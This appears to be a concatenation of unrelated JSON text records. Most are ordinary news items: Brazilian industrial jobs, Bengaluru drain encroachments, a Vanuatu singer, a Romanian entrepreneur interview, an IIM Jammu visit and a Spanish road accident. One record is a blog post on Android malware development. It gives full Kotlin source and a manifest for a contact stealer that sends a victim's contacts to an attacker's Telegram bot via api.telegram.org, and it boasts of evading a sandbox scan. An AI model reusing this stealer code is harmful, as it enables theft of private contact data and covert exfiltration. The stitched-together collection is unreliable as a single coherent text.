    "text": "Santa Catarina ocupa a terceira posição entre os estados brasileiros que mais geraram empregos na indústria durante o primeiro semestre de 2025, ficando atrás apenas de São Paulo e Minas Gerais. De acordo com dados do Novo Cadastro Geral de Empregados e Desempregados (Caged), do total de 80,4 mil novos postos de trabalho formais criados durante o período, 42 mil foram no setor industrial.\nContinua depois da publicidade\nO desempenho entre janeiro e junho de 2025, no entanto, já mostra sinais de desaquecimento da produção. Segundo Mario Cezar de Aguiar, presidente da Federação das Indústrias de Santa Catarina (FIESC), a maioria dos setores industriais apresentou saldo inferior ao registrado no primeiro semestre do ano passado.\nO setor de máquinas e equipamentos se destaca dentro dos setores da indústria que tiveram aumento de vagas em relação ao primeiro semestre de 2024. O ramo gerou 4,2 mil empregos no período, um aumento de 55,6% na comparação com o mesmo período do ano anterior. O resultado foi impactado pela produção de tratores e máquinas e equipamentos voltados à agropecuária, segundo o Observatório FIESC.\nEntre os empregos industriais, a construção civil foi o segmento que mais criou vagas: 12,1 mil, com destaque para o Litoral Norte de Santa Catarina. O segmento têxtil, de confecção, couro e calçados foi o segundo na geração de empregos, com 6,1 mil novas oportunidades no primeiro semestre. De acordo o economista Bruno Haeming, o ramo se mostrou resiliente, puxado pelo consumo das famílias, a despeito da perda de fôlego da economia\n— Em relação ao mesmo período do ano passado, o saldo de vagas apresentou leve recuo, refletindo sinais de moderação na atividade econômica — diz.\nContinua depois da publicidade\nO setor de alimentos e bebidas também apresentou saldo positivo de 4,2 mil empregos com carteira assinada até junho deste ano.\n— Surpreendeu na análise o crescimento de vagas em atividades como produção de suplementos, granolas, misturas e alimentos voltados à praticidade e alimentos funcionais — destacou Haeming.\nServiços gerou 31,3 mil novas vagas no primeiro semestre No primeiro semestre de 2025, o segmento de serviços gerou 31,3 mil novas vagas, enquanto o comércio criou 6,7 mil postos de trabalho formais. A agropecuária registrou saldo positivo de 385 vagas no ano até junho.\nConsiderando apenas junho, o segmento de serviços liderou a criação de empregos formais, com 3,3 mil vagas no mês. A indústria registrou 1,7 mil novos postos de trabalho, enquanto o comércio gerou 1 mil vagas. A agropecuária foi responsável por 489 oportunidades no período.\nContinua depois da publicidade\nLeia mais SC cria 6,5 mil vagas de emprego em junho com salários entre os maiores do país",

    "text": "BENGALURU: Residents of Mahadevapura who got encroachments cleared on storm water drains (SWDs) which connect Junnasandra Lake and Saul Kere (lake), have alleged that drains in Bellandur ward have been encroached again, leading to fear of floods among residents of Shanti Layout, Rainbow Drive Layout and Junnasandra village.\nAccording to Ashok Mruthyunjaya, AAP president of Mahadevapura constituency, 300 residents from these areas had held a padayatra in 2021, asking the authorities to act. During heavy rain, four feet of water would stagnate on roads here.\n“Three days ago, when the city recorded about 19mm rainfall, the Bellandur-Junnasandra Road was flooded, because the 10-ft drain has once again shrunk to 3ft due to encroachments,” he alleged. He added that there is a plan to divert the raja kaluve into the drains of Junnasandra village, which would lead to homes flooding.\nHe also stated that some influential builders have built 41 villas on the SWDs, and buyers moved into the villas 15 years ago without knowledge of this anomaly. “The builders need to buy additional land from the BBMP to build a SWDs for the damage they have caused,” he said.\nWhen TNIE called Malathi, Executive Engineer -- Storm Water Drains, she said water stagnation on roads in Bellandur ward is common because Rainbow Drive Layout blocked the flow after getting a court stay, stating there is no kharab land or SWD.\nRecently, when the Palike approached the community to make way for water flow, which connects to Sarjapura Road SWD, it again approached court, stating that BBMP was making forceful entry. “The Palike advocate managed to convince court of the urgency of making way for continuous water flow, and court has also granted permission. However, it has directed that no other construction by BBMP is allowed inside the Rainbow Drive premises,” said Malathi.",

    "text": "Uprising singer Sharon Nicholls, known as Shazza, has clarified her ‘body positivity’ comments during a recent interview with ABC Australia following critics judging the way she looks during her shows. “The whole idea that I put out on my interview was to give feedbacks and respond to my critics,” she said. “I am not implying that everyone should wear short skirts or tank tops, that’s not what I meant in my interview, what I was trying to say was directed to my critics. “Women should feel comfortable in whatever they are wearing; I’m not forcing anyone.” She apologised, saying it was not her intend to say something that would create an uproar on social media but to spread body positivity and being confident in your own skin, based on her own experiences as a young female artist. “I think in the cultural aspects of things, there’s going to be people saying that I shouldn’t wear this or that, or I should be wearing a cultural attire. “Whenever I’m on stage, I make sure people see me as I am, it’s a stage performance. “I am proud to be a Ni-Van woman and going out there and representing my country, there’s so many people who can do that and I’m so happy that I’m paving the way for them.” The singer said as a female artist who’s been exposed to the music industry at a very young age, it is very hard to get an opinion of herself. “I’m not sure about other female artists in Vanuatu and their experiences but I am really trying.” Shazza also added that when reading through every backlashing comments on social media, she noticed people comparing her to renowned singer Vanessa Quai, nonetheless she is a huge fan and looks up to her as a role model in the music industry. “I hear people talking about branding, I still do not have that money to make that on my own, it is a long-term thing that would probably happen in the future, but for now, I still don’t have my own brand or merchandise. “Right now, I’m focusing on how I would set the tone for Shazza and how I would represent Shazza to the world.” She implied her own focus was to be unique from everyone in the music industry. “There’s so many styles of music and musicians, there’s so many ways that you can portray your story in your music but Shazza is a whole different vibe. “We can’t keep following the crowd, needless to say, my audience is mostly youths since the music that I make, young people listen to and I completely understand that our elders won’t agree. “In order for our country to progress forward, we need to see change, we need to start living in this kind of lifestyle.” She said most of her critics was received from the people in the country. “It is sad to see how we are putting ourselves down instead of supporting each other,” she stressed. “However, I am always reminded that social media is not a safe place, I keep myself grounded because there is always going to be someone that says something different and that is okay. “Everyone will take it from a different angle and that’s totally fine. “I love the constructive criticism and no disrespect to the culture and the custom, my performances are entirely different to when I am at home with my family. “If I wanna wear an island dress, that really depends on the occasion and many of my shows have its own theme, so I dress accordingly to what I’m comfortable with and what tone I’m trying to reflect on.” “Because no-one else is going to help me move in this music career except for myself, so when I do speak in those interviews, I’m encouraging myself. “The whole point is, I’m a big girl, there’s no other big girls in the music industry here and all I’m trying to do is protect my integrity.” She acknowledged all her friends, families and fans who were very supportive to her since day one. “When I started this career I wanted to get exposure and be connected with everyone in the music scene, even though this is the first of many interviews (with ABC) I’m gonna do it again and no-one’s going to tell me what to put on my body.”",

    "text": "Reporter: What is the situation of the workforce in Valea Jiului? Are we talking about an aging workforce or are there also young people looking for work? Sorin Mihanţa: The workforce situation in Valea Jiului presents significant challenges. We are seeing increased difficulty in identifying the right staff, and employment opportunities are relatively rare. When such opportunities arise, applications are predominantly from women between the ages of 20 and 50 and young men. Although the latter do not have solid work experience, they often have difficulties in developing their motivation and ability to learn. This dynamic complicates the recruitment process and highlights the need for greater interest and commitment to support local workforce development. It is essential to cultivate an environment that encourages the growth and engagement of these potential employees. Reporter: How can the workforce in the area be professionally retrained? What percentage of ex-miners are willing to take vocational training or change jobs? Sorin Mihanţa: In our company, we focus on the qualification of employees directly at the workplace, giving them the opportunity to learn and adapt to new professional requirements. Virtually everyone who has joined our team has gone through this internal training process. Regarding the professional retraining of ex-miners, we note that most of them leave the mining industry through retirement at around the age of 45. As their pensions are generally more advantageous compared to average incomes in Romania, they do not show a high interest in re-employment or in vocational training for a career change. Reporter: How does the Just Transition Fund contribute to professional retraining? Sorin Mihanţa: The Fund for the Just Transition financed by the European Union plays an important role in professional reconversion, but it comes with certain conditions. One of these is the obligation to employ one person for every 175,000 euros received as non-refundable funding. This requirement requires employers not only to recruit new staff, but also to find solutions for their qualification and employee retention for five years, during the monitoring period, after the implementation of the project. Although financial support is valuable, employers see this obligation as a significant \"cost\" to cover in order to benefit from the funds. Reporter: From the point of view of to the entrepreneur, are the amounts allocated through the Just Transition Fund sufficient or is financial support from the Romanian state dedicated to SMEs in Valea Jiului necessary? Sorin Mihanţa: From the entrepreneur's perspective, the funds allocated through the Just Transition Fund are sufficient. However, a major challenge is managing the financial effort related to maintaining existing staff and hiring new staff on projects. Additional support in the form of dedicated programs for the insertion and qualification of new employees would be extremely beneficial. It would ease the financial challenge of employers and would significantly contribute to the success of the professional retraining and SME development initiatives in the Jiului Valley. • Entrepreneurs demand a special law for former mining areas Reporter: We know that on the agricultural side, there is a mountain law that provides facilities for farmers, agriculturists and producers of agri-food products and traditional textiles in the mountain area. Would such a law be necessary for former mining areas as well? What should it include? Sorin Mihanţa: A law similar to the Mountain Law, which would provide fiscal facilities and financial support for former mining areas, would certainly be beneficial. These communities face major economic challenges after the closure of the mines, and such a legislative initiative could support the development of new industries and economic revitalization. However, for such a law to be effective, extensive analysis and public debate would be necessary to identify the specific needs of these regions and to find a formula that does not distort market competition. This law could include, among other things, tax incentives for local entrepreneurship, subsidies for vocational retraining and support for the development of the infrastructure necessary for new economic activities. At the same time, it could facilitate access to non-reimbursable financing for projects that create jobs and contribute to the diversification of the local economy. Such an approach could support the transition from a mining-based economy to a sustainable one adapted to today's requirements. Reporter: How is your business going? What was the turnover recorded in 2023 compared to 2022? What are your predictions for the end of this year? Sorin Mihanţa: The year 2024 proved to be a challenging one, especially in the context of the European financial crisis, which significantly affected demand. We are experiencing a decline in demand, a trend that has been playing out for several years and unfortunately does not seem to be ending in the near future. However, in 2023, we saw a 30% increase in turnover compared to 2022, which was an encouraging result. However, estimates for 2024 indicate a return to the level of 2022, which means a decrease of approximately 30% compared to 2023. To adapt to these challenges, we had to identify strategic solutions to maintain the stability of the business. In this sense, we have started steps to expand into new markets, such as Romania and Israel, and we have diversified our product range, in order to access these emerging markets. These steps give us hope that we will be able to mitigate the impact of the drop in demand and better position ourselves for the future. • Successful partnership with UK companies Reporter: I noticed that you have focused your business on export, especially to the UK. What are the conditions for your business with your British partners? Is it difficult to enter the British market or easier compared to Romania? Did you experience any difficulty entering that market? What are the main products that British customers want? Sorin Mihanţa: The British market is a special one and stands out for its specific requirements and unique products compared to other European countries, especially in the sector in which we operate, namely the manufacture and export of wooden windows and doors for the exterior. Especially in London and the surrounding areas, these products have a distinctive design: sash windows and outward-opening windows, elements that make them unique in Europe. This specific design involves considerable technical challenges in terms of the manufacturing process, as it is difficult to acquire the necessary knowledge to produce these types of windows according to local requirements. As well as the technical difficulties, the strict rules governing the construction and replacement of old windows in the UK add another layer of complexity. There are well-established and extremely rigorous rules governing the construction market, and the process of authorizing and monitoring the works requires close collaboration with local commercial partners. They must thoroughly understand these regulations and be qualified toto function in such a specific environment. Thus, accessing the UK market is much more difficult compared to other markets in Europe or Romania. However, the experience gained in over 10 years of activity in this market has allowed us to adapt and develop successful partnerships. This experience has also been extremely useful in our recent collaboration with our partner in Israel, who operate in an environment with similar requirements to the UK. Reporter: I understand that you want to expand your business in the Romanian market as well. How would you characterize the market in our country in the field in which you operate? Do you have products dedicated to customers in our country or are you thinking about something like this? Will the expansion of the activity also require an increase in the number of employees? Sorin Mihanţa: One of our objectives within the Just Transition program is to expand the range of products on the Romanian market as well. We aim to provide customers in the country with a variety of products, such as laminated wood windows with double glazing, exterior aluminum clad windows, laminated wood entry doors and other wood-based composite materials, as well as interior wooden doors solid or composite. In general, customers who opt for wooden windows and doors are high-income earners who emphasize natural materials, high thermal efficiency and a premium finish, accompanied by the highest quality service. In order to meet the demands of the Romanian market and to maintain the high standards of the products, the expansion of the activity will certainly require an increase in the number of employees. We plan to open up more production streams, which will likely involve working in double shifts, to ensure we can cover both domestic and overseas demand. • \"The support that the state offers to the domestic business environment, especially SMEs, is not enough or well-directed\" Reporter: How does a Romanian entrepreneur from Valea Jiului manage, in the current fiscal conditions in our country? What was the impact of the generalization of Ro e-Invoice and Ro e-Transport systems? What tax changes would you like to make your business run in good conditions, both for the company you own and for the state budget and local budget? Sorin Mihanţa: We are generally doing well in the current fiscal conditions, as long as we manage to sustain the turnover needed to cover payments to suppliers, employees, banks and the state. The implementation of the Ro e-Invoice and Ro e-Transport systems did not raise major difficulties for us, considering the experience we have in managing the business. We also have qualified financial staff, and the fact that we do not have a very large number of suppliers and customers has helped us to manage these new requirements more easily. Regarding tax changes, I think it would be preferable if they were as infrequent as possible and provide predictability. If changes are required, it is important that they are implemented with reasonable timescales to allow companies to adapt. At the same time, a wider digitization of state institutions would be desirable, in order to simplify and facilitate interaction with them. The current level of taxation is quite burdensome, especially in the manufacturing industry, where we face major challenges in finding customers and markets, managing staff, qualifying and retaining them, but also in ensuring decent wages. The investments required for development, technology and workforce qualification are considerable. Overall, I believe that the support that the state offers to the local business environment, especially SMEs, is not enough or well-directed enough. A clearer and more focused approach to supporting these enterprises would be essential to stimulate economic growth and development at the local level. It is vital that we create a framework that facilitates access to resources and opportunities so that SMEs can effectively contribute to the prosperity of our community. Reporter: Thank you.",

    "text": "Excelsior Correspondent JAMMU, Dec 28: The Indian Institute of Management Jammu (IIM) Jammu hosted Dharmendra Pradhan, Union Minister of Education and Skill Development & Entrepreneurship, for a momentous visit that included a comprehensive review of ongoing construction activities in the campus. This visit not only underscored the Institute’s steadfast commitment to academic excellence and innovation but also aligned seamlessly with the broader goals of national progress under the visionary initiative, “Viksit Bharat”. The event was presided by Dr Milind P Kamble (Chairman, Board of Governors, IIM Jammu), Prof BS Sahay (Director, IIM Jammu), Prof Jabir Ali (Dean Academics), Kesavan Baskkaran (Chief Administrative Officer, IIM Jammu) along with officials from the Ministry, faculty, officers, staff and students of the Institute. Dharmendra Pradhan planted a Rudraksha sapling in the permanent campus during the visit and commenced the event with a traditional lamp lighting ceremony. Speaking on the occasion, the Minister gave a detailed overview into the ideas for the vision Viksit Bharat @2047 initiative. He mentioned about Prime Minister Narendra Modi’s governance philosophy, approach of uplifting those at the bottom of pyramid, Sabka Saath-Sabka Vikas model, and the need for promoting education in mother tongue. He reiterated, “India has witnessed rapid transformation post 2014 and is on its way to become the third largest economy in the world”. The PM’s welfarism model is a case study, he said and asked the IIM Jammu family to examine it minutely and come up with long-term case studies on the unique propositions and possibilities for Jammu & Kashmir. Stating that the next 25 year are crucial, he urged everyone that with ‘Sabka Prayas’ we must realize the goal of Viksit Bharat @2047. Dr Milind P Kamble, in his address, highlighted several key initiatives undertaken by IIM Jammu in a short span of time, further reinforcing its commitment to fostering a conducive and inclusive learning environment at the Institute.

    "text": "Mobile malware development trick 2. Abuse Telegram Bot API: Contacts. Simple Android (Java/Kotlin) stealer example.\n﷽\nThis post is based on section from my AIYA - Mobile malware development book, decided to add this to my blog so that everything would be in one place.\nIn this example, we will demonstrate how an attacker could abuse the Telegram Bot API to exfiltrate another sensitive information, such as contacts, from an infected Android device. The attacker uses OkHttp\nto send the stolen data as Telegram bot to chat ID (remote).\nThis tutorial will also highlight how adversaries can collect device information and contacts and send them to a Telegram bot using a combination of Android Contacts API, OkHttp, and Telegram Bot API.\npractical example\nIn this case, imagine that the adversary has already compromised an Android device. The malicious app installed on the device. Then collects contacts and device information. The app then sends this sensitive data to a Telegram Chat ID controlled by the attacker using OkHttp\n.\nYour project’s structure looks like there (HackContacts2\n):\nFirst of all add contacts permission to your manifest file:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\nxmlns:tools=\"http://schemas.android.com/tools\">\n<uses-feature\nandroid:name=\"android.hardware.telephony\"\nandroid:required=\"false\" />\n<uses-permission android:name=\"android.permission.INTERNET\"/>\n<uses-permission android:name=\"android.permission.READ_CONTACTS\"/>\n<application\nandroid:allowBackup=\"true\"\nandroid:dataExtractionRules=\"@xml/data_extraction_rules\"\nandroid:fullBackupContent=\"@xml/backup_rules\"\nandroid:icon=\"@mipmap/ic_launcher\"\nandroid:label=\"@string/app_name\"\nandroid:roundIcon=\"@mipmap/ic_launcher_round\"\nandroid:supportsRtl=\"true\"\nandroid:theme=\"@style/Theme.HackContacts\"\ntools:targetApi=\"31\">\n<activity\nandroid:name=\".MainActivity\"\nandroid:exported=\"true\"\nandroid:label=\"@string/app_name\"\nandroid:theme=\"@style/Theme.HackContacts\">\n<intent-filter>\n<action android:name=\"android.intent.action.MAIN\" />\n<category android:name=\"android.intent.category.LAUNCHER\" />\n</intent-filter>\n</activity>\n</application>\n</manifest>\nThe components of the our malicious application: the app uses the Android Contacts Content Provider (ContactsContract\n) to fetch the user’s contacts, the app then sends the gathered data via an HTTP request via Telegram Bot API.\nAs the previous examples, we need the getContacts()\nfunction. This function queries the ContactsContract\ncontent provider to extract the contacts from the device. The extracted contact information (name and phone number) is added to the message that will be sent to the Telegram bot:\nfun getContacts(): String {\nval contactsList = mutableListOf<String>()\nval contentResolver = context.contentResolver\nval cursor = contentResolver.query(\nContactsContract.CommonDataKinds.Phone.CONTENT_URI,\nnull,\nnull,\nnull,\nnull\n)\ncursor?.use {\nval nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)\nval numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)\nwhile (it.moveToNext()) {\nval name = it.getString(nameIndex)\nval number = it.getString(numberIndex)\ncontactsList.add(\"$name: $number\")\n}\n}\nreturn contactsList.joinToString(separator = \"\\n\")\n}\nThen sends the retrieved contacts to an attacker-controlled Telegram Bot API using OkHttp:\n// function to send contacts using OkHttp\nfun sendContacts(message: String) {\nval token = getTokenFromAssets()\nval chatId = getChatIdFromAssets()\nval contacts = getContacts()\nval meow = \"Meow! ♥️\\uFE0F\"\nval messageToSend = \"$message\\n\\n$contacts\\n\\n$meow\\n\\n\"\nval requestBody = FormBody.Builder()\n.add(\"chat_id\", chatId)\n.add(\"text\", messageToSend)\n.build()\nval request = Request.Builder()\n.url(\"https://api.telegram.org/bot$token/sendMessage\")\n.post(requestBody)\n.build()\n// send the request asynchronously using OkHttp\nclient.newCall(request).enqueue(object : Callback {\noverride fun onFailure(call: Call, e: IOException) {\ne.printStackTrace()\n}\noverride fun onResponse(call: Call, response: Response) {\nif (response.isSuccessful) {\n// Handle success\nprintln(\"Message sent successfully: ${response.body?.string()}\")\n} else {\nprintln(\"Error: ${response.body?.string()}\")\n}\n}\n})\n}\nSo the full source code of the sending logic is looks like this HackContacts\n:\npackage com.example.hackcontacts2\nimport android.content.Context\nimport android.provider.ContactsContract\nimport okhttp3.*\nimport java.io.IOException\nclass HackContacts2(private val context: Context) {\nprivate val client = OkHttpClient()\n// function to send contacts to Telegram\nfun sendContacts() {\nval token = getTokenFromAssets()\nval chatId = getChatIdFromAssets()\nval contacts = getContacts() // fetch contacts\nval meow = \"Meow! ♥️\\uFE0F\"\nval messageToSend = \"$contacts\\n\\n$meow\\n\\n\"\n// create request body\nval requestBody = FormBody.Builder()\n.add(\"chat_id\", chatId)\n.add(\"text\", messageToSend)\n.build()\n// send request to Telegram API\nval request = Request.Builder()\n.url(\"https://api.telegram.org/bot$token/sendMessage\")\n.post(requestBody)\n.build()\n// Send request asynchronously\nclient.newCall(request).enqueue(object : Callback {\noverride fun onFailure(call: Call, e: IOException) {\ne.printStackTrace()\n}\noverride fun onResponse(call: Call, response: Response) {\nif (response.isSuccessful) {\nprintln(\"Message sent successfully: ${response.body?.string()}\")\n} else {\nprintln(\"Error: ${response.body?.string()}\")\n}\n}\n})\n}\n// function to fetch contacts\nfun getContacts(): String {\nval contactsList = mutableListOf<String>()\nval contentResolver = context.contentResolver\nval cursor = contentResolver.query(\nContactsContract.CommonDataKinds.Phone.CONTENT_URI,\nnull,\nnull,\nnull,\nnull\n)\ncursor?.use {\nval nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)\nval numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)\nwhile (it.moveToNext()) {\nval name = it.getString(nameIndex)\nval number = it.getString(numberIndex)\ncontactsList.add(\"$name: $number\")\n}\n}\nreturn contactsList.joinToString(separator = \"\\n\")\n}\n// fetch token and chatId from assets (assuming these are saved in files)\nprivate fun getTokenFromAssets(): String {\nreturn context.assets.open(\"token.txt\").bufferedReader().readText().trim()\n}\nprivate fun getChatIdFromAssets(): String {\nreturn context.assets.open(\"id.txt\").bufferedReader().readText().trim()\n}\n}\nAnd in the MainActivity\nwe just request permissions and send contacts via Telegram:\npackage com.example.hackcontacts2\nimport android.Manifest\nimport android.content.Context\nimport android.os.Bundle\nimport android.widget.Button\nimport android.widget.Toast\nimport androidx.activity.ComponentActivity\nimport com.karumi.dexter.Dexter\nimport com.karumi.dexter.PermissionToken\nimport com.karumi.dexter.listener.PermissionDeniedResponse\nimport com.karumi.dexter.listener.PermissionGrantedResponse\nimport com.karumi.dexter.listener.PermissionRequest\nimport com.karumi.dexter.listener.single.PermissionListener\nclass MainActivity : ComponentActivity() {\nprivate lateinit var meowButton: Button\nprivate val hackContacts = HackContacts2(context = this)\nprivate fun startContactsPermissionRequest(context: Context) {\nDexter.withContext(context)\n.withPermission(Manifest.permission.READ_CONTACTS)\n.withListener(object : PermissionListener {\noverride fun onPermissionGranted(p0: PermissionGrantedResponse?) {\nToast.makeText(\ncontext,\n\"Hack Contacts permission granted\",\nToast.LENGTH_SHORT\n).show()\n}\noverride fun onPermissionDenied(p0: PermissionDeniedResponse?) {\nToast.makeText(\ncontext,\n\"Hack Contacts permission denied\",\nToast.LENGTH_SHORT\n).show()\n}\noverride fun onPermissionRationaleShouldBeShown(\np0: PermissionRequest?,\np1: PermissionToken?\n) {\n}\n}).check()\n}\noverride fun onCreate(savedInstanceState: Bundle?) {\nsuper.onCreate(savedInstanceState)\nsetContentView(R.layout.activity_main)\nstartContactsPermissionRequest(this)\nmeowButton = findViewById(R.id.meowButton)\nmeowButton.setOnClickListener {\nhackContacts.sendContacts()\n}\n}\n}\nSo in this scenario, the malicious app on an infected Android device abuses Telegram’s Bot API to exfiltrate contacts. Once the READ_CONTACTS\npermission is granted, the app:\n-\nfetches contacts from the device using Android’s Contacts Content Provider.\n-\nformats the contacts into a string and appends a custom message (e.g., “Meow! ♥️”).\n-\nsends the contacts to the attacker-controlled Telegram bot via OkHttp by making a POST request via the Telegram Bot API.\ndemo\nLet’s go to see this in action.\nRun in the emulator:\nThen click Meow\nbutton:\nAlso install and check on the real device:\nJust click Meow\nbutton:\nAs you can see everything is wokred perfectly! =^..^=\nOf course in the real scenario with the real device, you need to create file with list of contacts, something like this:\nprivate fun createTempFile(prefix: String, suffix: String): File {\nval parent = File(System.getProperty(\"java.io.tmpdir\")!!)\nval temp = File(parent, prefix + suffix)\nif (temp.exists()) {\ntemp.delete()\n}\ntry {\ntemp.createNewFile()\n} catch (ex: IOException) {\nex.printStackTrace()\n}\nreturn temp\n}\nprivate fun getContacts() {\nval contactsList = mutableListOf<String>()\nval contactsListFile = createTempFile(\"Contacts\", \".txt\")\nval contentResolver = context.contentResolver\nval cursor = contentResolver.query(\nContactsContract.CommonDataKinds.Phone.CONTENT_URI,\nnull,\nnull,\nnull,\nnull\n)\ncursor?.use {\nval nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)\nval numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)\nwhile (it.moveToNext()) {\nval name = it.getString(nameIndex)\nval number = it.getString(numberIndex)\ncontactsList.add(\"$name: $number\")\n}\n}\n// join all contacts into a big single text\nval contactsText = contactsList.joinToString(separator = \"\\n\")\nif (contactsText.isNotEmpty()) {\nHackContacts2(context).saveAndSendFile(contactsListFile, contactsText)\n} else {\nHackContacts2(context).sendTextMessage(\"no contacts found.\")\n} // something like this, you need to create function for sending msg\n}\nUpload this application to ANY.RUN. First of all, we need to choose Android device for analysis:\nThen just wait:\nAs you can see the sandbox allows the requested permission during testing.\nThen:\nAs you can see, everything is worked as expected, we see that our message is successfully sent to Telegram server.\nANY.RUN says: No threats found\nBut:\nalso, ANY.RUN says: “Process communicates with Telegram (possibly using it as an attacker’s C2 server) (T1102)\nGreat!!!\nThis is a practical example for Android developers, malware researchers, blue teamers, red teamers, and threat hunters to understand how Telegram or other legitimate services could be used by adversaries to bypass detection and steal information.\nThanks to ANY.RUN for API!\nThis is a practical case for educational purposes only.\nThanks for your time happy hacking and good bye!\nPS.

    "text": "Una persona ha fallecido en un accidente de tráfico registrado pasado el mediodía de este jueves en el municipio granadino de Nevada, en la Alpujarra, tras caer con su turismo por un terraplén, según ha informado Emergencias 112 Andalucía. El servicio adscrito a la Consejería de la Presidencia, Interior, Diálogo Social y Simplificación Administrativa ha señalado en una nota de prensa que el teléfono 112 ha atendido a las 14,04 horas un aviso del Centro de Emergencias Sanitarias 061 por un vehículo que se salió de la calzada y cayó por un terraplén de unos 20 metros de profundidad en el conocido como Pago del Soplón, en la localidad de Laroles, cerca de la vía A-4310, en término de Nevada. Según las primeras informaciones, el conductor salió despedido del vehículo en una zona de difícil acceso. Hasta el lugar se enviaron al servicio médico, con ambulancia y helicóptero sanitario, mientras que por parte de la sala coordinadora se activó a los Bomberos de Cádiar, a la Guardia Civil y a la Policía Local. Una vez en el lugar, los operativos han confirmado el fallecimiento del conductor, según los primeros indicios debido a una salida de vía por un camino de tierra y posterior caída por un terraplén, activando la Guardia Civil el protocolo judicial como es preceptivo para el levantamiento del cadáver.
